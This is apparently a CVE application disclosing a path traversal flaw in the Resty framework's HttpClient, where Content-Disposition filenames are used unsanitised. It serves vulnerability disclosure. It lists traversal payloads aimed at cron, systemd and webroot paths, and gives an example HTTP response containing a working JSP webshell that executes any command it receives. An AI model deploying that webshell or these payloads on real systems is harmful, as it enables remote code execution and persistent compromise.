# CVE Application Form

## Vulnerability Type Info
**Path Traversal / Directory Traversal (CWE-22)**

---

## Vendor of the Product(s) Info
**Vendor Name**: Dreampie

**Vendor Homepage**: https://github.com/Dreampie

**Note**: Please ensure Dreampie/Resty is added to the CVE products and sources list if not already present.

---

## Affected Product(s)/Code Base Info

### Product 1
- **Product**: Resty Framework - HttpClient Module
- **Affected Versions**: All versions <= 1.3.1.SNAPSHOT (including all historical releases)
- **Fixed Version**: None (currently unfixed as of 2025-11-02)

**Component Details**:
- Module: resty-httpclient
- Package: cn.dreampie.client
- Maven Coordinates: `cn.dreampie:resty-httpclient:1.3.1.SNAPSHOT`

---

## Optional Information

### Has Vendor Confirmed or Acknowledged the Vulnerability?
**No** - Vendor notification pending as of 2025-11-02

---

## Attack Type Info
**Remote**

The vulnerability can be exploited remotely when:
1. Attacker controls the HTTP server being accessed (malicious third-party API)
2. Attacker performs Man-in-the-Middle (MITM) attack on HTTP connections
3. Legitimate server is compromised (supply chain attack)
4. Application uses user-configurable download sources

---

## Impact Info

☑ **Code Execution**
- Deploy webshells (JSP/Servlet) to web application directories
- Install malicious systemd services for code execution on boot
- Inject executable scripts into PATH directories

☑ **Escalation of Privileges**
- Overwrite sudo configuration files
- Inject SSH authorized_keys for root access
- Install privileged systemd services
- Modify system service configurations

☑ **Information Disclosure**
- Overwrite application configuration to redirect database connections
- Capture credentials by replacing config files
- Exfiltrate data by modifying logging configurations

☑ **Denial of Service**
- Overwrite critical system files (e.g., `/etc/passwd`, `/etc/shadow`)
- Fill disk space by writing to system directories
- Corrupt application files causing crashes

☐ Other

---

## Affected Component(s)

**Primary Affected Component**:
- File: `/resty-httpclient/src/main/java/cn/dreampie/client/HttpClient.java`
- Lines: 157-178
- Function: File download with automatic filename extraction from Content-Disposition header
- Class: `cn.dreampie.client.HttpClient`
- Method: `request()` - specifically the file download logic branch

**Vulnerable Code Flow**:
```
HttpClient.request()
  → conn.getHeaderField("Content-Disposition")
  → contentDisposition.substring() [NO SANITIZATION]
  → new File(fileOrDirectory, fileName) [PATH TRAVERSAL]
  → StreamReader.writeFileFromInputStream() [ARBITRARY WRITE]
```

---

## Attack Vector(s)

### Method 1: Man-in-the-Middle (MITM) Attack
**Prerequisites**:
- Application uses HTTP (not HTTPS) for file downloads
- Attacker on same network or has network-level access (ARP spoofing, rogue WiFi, DNS hijacking)

**Exploitation**:
1. Application initiates HTTP download: `client.build("/file").setDownloadFile("/app/temp/").get()`
2. Attacker intercepts HTTP response using tools like Ettercap, Bettercap, or mitmproxy
3. Attacker modifies `Content-Disposition` header: `filename=../../../etc/cron.d/backdoor`
4. File written to `/etc/cron.d/backdoor` instead of `/app/temp/`

### Method 2: Malicious Third-Party Server
**Prerequisites**:
- Application downloads from user-controllable URLs or third-party APIs
- No HTTPS certificate pinning

**Exploitation**:
1. Attacker provides malicious URL to application (e.g., via user settings, database injection)
2. Application downloads from attacker's server
3. Attacker returns response with malicious `Content-Disposition: filename=../../webroot/shell.jsp`
4. Webshell deployed to application directory

### Method 3: Compromised CDN/Update Server
**Prerequisites**:
- Application uses auto-update mechanism or CDN for file delivery
- Update server is compromised (supply chain attack)

**Exploitation**:
1. Attacker compromises legitimate update server
2. Application requests normal update file
3. Server returns malicious `Content-Disposition: filename=../../../etc/systemd/system/backdoor.service`
4. Persistent backdoor installed system-wide

### Method 4: Microservice Architecture Attack
**Prerequisites**:
- Application downloads files from internal microservices
- One microservice is compromised

**Exploitation**:
1. Attacker compromises one microservice in the architecture
2. Other services download files from compromised service
3. Compromised service returns path traversal payload in Content-Disposition
4. Lateral movement achieved across microservices

### Example Malicious HTTP Response
```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename=../../../var/www/html/shell.jsp
Content-Length: 156

<%@ page import="java.io.*" %>
<%
  Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String s; while((s=br.readLine())!=null) out.println(s);
%>
```

---

## Suggested Description for CVE

**Title**: Path Traversal in Resty Framework HttpClient via Unsanitized Content-Disposition Header

**Description**:

A path traversal vulnerability exists in Resty Framework's HttpClient module (all versions including and prior to 1.3.1.SNAPSHOT). When the HttpClient downloads files to a directory (as opposed to a specific file path), it automatically extracts the filename from the HTTP response's Content-Disposition header without performing any path sanitization. An attacker controlling the HTTP response can inject path traversal sequences (e.g., `../`) in the filename to write files to arbitrary locations on the filesystem.

This vulnerability can be exploited through multiple attack vectors including Man-in-the-Middle attacks on HTTP connections, malicious third-party API servers, compromised CDN/update servers, or lateral movement in microservice architectures. Successful exploitation can lead to remote code execution (via webshell deployment or malicious script injection), privilege escalation (via SSH key injection or systemd service installation), data exfiltration (via configuration file replacement), or denial of service (via critical file corruption).

The vulnerability is located in `/resty-httpclient/src/main/java/cn/dreampie/client/HttpClient.java` at lines 157-178, where the filename is extracted via `contentDisposition.substring(fileNameIndex + 9)` and directly used in `new File(fileOrDirectory, fileName)` without validation. Notably, the framework's file upload handler (MultipartParser) correctly implements path traversal protection by stripping directory separators, indicating this is a security regression rather than intentional design.

**CVSS 3.1 Score**: 8.1 (HIGH)
**Vector String**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H

---

## Discoverer(s)/Credits Info

**Primary Discoverer**: s1ain

**Discovery Method**:
- Systematic security audit of Resty framework
- Pattern-based vulnerability clustering analysis
- Comparative analysis with framework's MultipartParser security controls

**Discovery Date**: November 1, 2025

**Organization**: Independent Security Researcher

---

## Reference(s) Info

https://github.com/Dreampie/Resty
https://github.com/Dreampie/Resty/blob/master/resty-httpclient/src/main/java/cn/dreampie/client/HttpClient.java
https://cwe.mitre.org/data/definitions/22.html
https://owasp.org/www-community/attacks/Path_Traversal

---

## Additional Information

### Technical Details

**Root Cause Analysis**:
The vulnerability stems from the framework's design decision to automatically extract filenames from HTTP responses for user convenience, without considering that HTTP responses (especially over HTTP rather than HTTPS) should be treated as untrusted input similar to user uploads.

**Evidence of Security Regression**:
The framework's MultipartParser.java (lines 414-418) includes explicit path traversal protection with the comment: "The filename may contain a full path. Cut to just the filename." This proves developers were aware of path traversal risks, making the HttpClient omission a security bug rather than intentional design.

**Comparison Table**:
```
Security Measure          | MultipartParser (Upload) | HttpClient (Download)
--------------------------|-------------------------|---------------------
Input Source             | User upload             | HTTP response
Trust Level              | Untrusted               | Untrusted
Path Separator Removal   | ✓ Implemented          | ✗ Missing
Path Traversal Protection| ✓ Basic                | ✗ None
```

### Proof of Concept

A working proof-of-concept demonstrating arbitrary file write is included in the full vulnerability report. The PoC shows how a malicious HTTP server can write a cron job to `/etc/cron.d/` when the application expects to download to `/tmp/safe_downloads/`.

### Impact on Deployment

This vulnerability affects any Java application using Resty's HttpClient module for file downloads, particularly:
- Applications with auto-update functionality
- Systems downloading from third-party APIs or CDNs
- Microservice architectures using HTTP for inter-service file transfers
- IoT devices or embedded systems using HTTP (not HTTPS) for firmware updates
- Applications allowing user-configurable download sources

### Remediation Status

As of 2025-11-02:
- **Vendor Notified**: No (pending)
- **Patch Available**: No
- **Workaround Available**: Yes (use explicit file paths instead of directory mode)
- **Public Disclosure**: Pending responsible disclosure timeline (90 days after vendor notification)

### Related Security Issues

This is part of a broader security audit that identified multiple issues in the Resty framework. However, this path traversal vulnerability in HttpClient is independently exploitable and warrants separate CVE assignment due to:
1. Distinct affected component (HttpClient vs other modules)
2. Different attack vectors (HTTP response manipulation vs other vectors)
3. Unique impact scenarios (file download context)
4. Separate remediation requirements

### Severity Justification

The CVSS 8.1 (HIGH) score is justified by:
- **Network Attack Vector**: Exploitable remotely via MITM or malicious servers
- **Low Attack Complexity**: Straightforward exploitation requiring only HTTP response control
- **No Privileges Required**: No authentication needed
- **No User Interaction**: Automatic when application downloads files
- **High Integrity Impact**: Arbitrary file write enabling code execution
- **High Availability Impact**: Can corrupt critical system files

### Disclosure Timeline

- **Nov 1, 2025**: Vulnerability discovered during comprehensive security audit
- **Nov 2, 2025**: CVE application submitted
- **Pending**: Vendor notification via GitHub security advisory
- **Pending**: 90-day disclosure timeline begins after vendor acknowledgment
- **Pending**: Public disclosure with technical details and PoC

---

**Submission Date**: 2025-11-02
**Submitted By**: s1ain
**Contact**: [To be provided during CVE assignment process]
